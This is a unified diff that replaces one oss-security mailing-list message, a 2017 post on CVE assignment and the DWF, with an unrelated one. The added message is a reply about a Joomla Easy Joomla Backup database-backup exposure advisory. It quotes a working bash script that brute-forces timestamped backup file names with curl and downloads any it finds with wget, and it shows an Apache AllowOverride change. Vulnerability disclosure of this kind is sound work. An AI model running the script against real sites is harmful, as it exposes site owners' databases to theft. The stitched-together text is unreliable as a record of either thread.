@@ -1,60 +1,90 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/05/23/15
-Message-ID: <e1edcfd7-0547-c5c5-004e-fd6ade086b2e@redhat.com>
-Date: Tue, 23 May 2017 08:43:25 -0600
-From: Kurt Seifried <kseifried@...hat.com>
-To: "Perry E. Metzger" <perry@...rmont.com>
-Cc: oss-security@...ts.openwall.com
-Subject: Re: How to request a CVE for open source projects
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/09/28/8
+Message-id: <28E19EE5-7EC0-4712-80CE-5D2AD4C4B932@me.com>
+Date: Thu, 28 Sep 2017 12:05:40 -0400
+From: "Larry W. Cashdollar" <larry0@...com>
+To: oss-security@...ts.openwall.com
+Subject: Re: Joomla extension Easy Joomla Backup v3.2.4 database backup exposure
 Content-Type: text/plain; charset=utf-8
 
+Hi David,
 
+This is correct, hardened shared hosting platforms won't be vulnerable to this attack.
 
-On 2017-05-22 8:28 PM, Perry E. Metzger wrote:
-> On Mon, 22 May 2017 20:04:41 -0600 Kurt Seifried
-> <kseifried@...hat.com> wrote:
->>> Primarily, freeform discussion of the sort that occurred on this
->>> list as a natural outcropping of the CVE request process led to
->>> people linking to verification code, temporary mitigations,
->>> highlighting of incomplete fixes, and the sort of information
->>> that was requested earlier in this thread.  This ability to
->>> easily chip in to ongoing situations wasn't just useful for mitre
->>> staff doing CVE work, it was also useful for the "community of
->>> practice" looking for the latest information regarding
->>> self-defense.  I've prevented more than one attack thanks to a
->>> one-off reply from someone in response to a CVE request.    
->> You can still do this. oss-security is a list run by Solar Designer
->> (openwall.com). I happen to be a long time poster/moderator, but I
->> have no official control/etc (I don't even block posts, that's up
->> to solar, I just allow stuff or ignore it when it's up for
->> moderation).
-> Maybe after CVEs are assigned the forms could be emailed to the list
-> as a replacement for the old request emails, to kick off
-> discussion and alert people to their existence?
->
-> Perry
-The primary goals of the DWF are:
+I've now updated the configuration on my lab Ubuntu system by changing apache2.conf:
 
-1) Creating CVE Mentors that can do CVE assignments, train other CVE
-Mentors, and help create CNAs
-2) Creating CNAs for OpenSource so CVE assignments happen as close to
-the vulnerability as possible
-3) "retail" CVE assignments (e.g. people using iwantacve.org)
-4) Publishing that data to MITRE quickly as per the CNA guidelines, and
-the community in general (so at a minimum you can just monitor github,
-there may be more options moving forwards)
+# diff -Nur orig apache2.conf 
+--- orig	2017-09-28 12:02:13.674668975 -0400
++++ apache2.conf	2017-09-28 11:47:50.898322778 -0400
+@@ -163,7 +163,7 @@
+ 
+ <Directory /var/www/>
+ 	Options Indexes FollowSymLinks
+-	AllowOverride None
++	AllowOverride All
+ 	Require all granted
+ </Directory>
 
-And that's basically it. If people want to monitor the CVEs the DWF
-assigns and run a git to email gateway essentially they are welcome to
-assuming they get Solar's approval (it's his list so his rules), but
-it's out of scope for the DWF at this point.
+Thanks,
+Larry
 
-If people want the cat to have a nice bell they may have to step up and
-actually put a bell on the cat.
-
--- 
-Kurt Seifried -- Red Hat -- Product Security -- Cloud
-PGP A90B F995 7350 148F 66BF 7554 160D 4553 5E26 7993
-Red Hat Product Security contact: secalert@...hat.com
-
+> On Sep 28, 2017, at 9:09 AM, David Jardin <david.jardin@...munity.joomla.org> wrote:
+> 
+> It’s worth to mention that the extension has a default .htaccess file with a „deny from all“ in the backup directory, that will mitigate the described attack on pretty much any standard shared-hosting platform that I’m aware of.
+> 
+> 
+> 
+> 
+> Am 28. September 2017 um 14:37:20, Larry W. Cashdollar (larry0@...com) schrieb:
+> 
+>> Title: Joomla extension Easy Joomla Backup v3.2.4 database backup exposure 
+>> Author: Larry W. Cashdollar, @_larry0 
+>> Date: 2017-09-07 
+>> CVE-ID:[CVE-2017-2550] 
+>> Download Site: https://joomla-extensions.kubik-rubik.de/ejb-easy-joomla-backup 
+>> Vendor: kubik-rubik 
+>> Vendor Notified: 2017-09-07 
+>> Vendor Contact: 
+>> Advisory: http://www.vapidlabs.com/advisory.php?v=200 
+>> Description: Easy Joomla Backup creates 'old-school' backups without any frills. 
+>> Vulnerability: 
+>> The software creates a copy of the backup in the web root. The file name is easily guessable as it's just a time stamp: 
+>> 
+>> http://example.com/administrator/components/com_easyjoomlabackup/backups/DOMAIN_YEAR-MONTH-DAY_H-M-S.zip 
+>> 
+>> Exploit Code: 
+>> • #!/bin/bash 
+>> • #Larry W. Cashdollar, @_larry0 9/7/2017 
+>> • #Bruteforce download backups for Joomla Extension Easy Joomla Backup v3.2.4 
+>> • #https://joomla-extensions.kubik-rubik.de/ejb-easy-joomla-backup 
+>> • MONTH=09 
+>> • DAY=07 
+>> • YEAR=2017 
+>> • Z=0 
+>> • #May need to set the DOMAIN to $1 the target depending on how WP is configured. 
+>> • DOMAIN=192.168.0.163 
+>> •  
+>> • echo "Scanning website for available backups:" 
+>> • for y in `seq -w 0 23`; do 
+>> • for x in `seq -w 0 59`; do 
+>> • Y=`echo "scale=2;($Z/86000)*100"|bc`; 
+>> • echo -ne "\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b$CPATH $Y%" 
+>> • for z in `seq -w 0 59`; do 
+>> • Z=$(( $Z + 1 )); 
+>> • CPATH="http://$1/administrator/components/com_easyjoomlabackup/backups/"$DOMAIN"_"$YEAR"-"$MONTH"-"$DAY"_"$y"-"$x"-"$z".zip"; 
+>> • RESULT=`curl -s --head $CPATH|grep 200`; 
+>> • if [ -n "$RESULT" ]; then 
+>> • echo "" 
+>> • echo "[+] Location $CPATH Found"; 
+>> • echo "[+] Received $RESULT"; 
+>> • echo "Downloading......"; 
+>> • wget $CPATH 
+>> • fi; 
+>> • done 
+>> • done 
+>> • done 
+>> • echo "Completed."
+> -- 
+> Kind Regards,
+> David Jardin
 
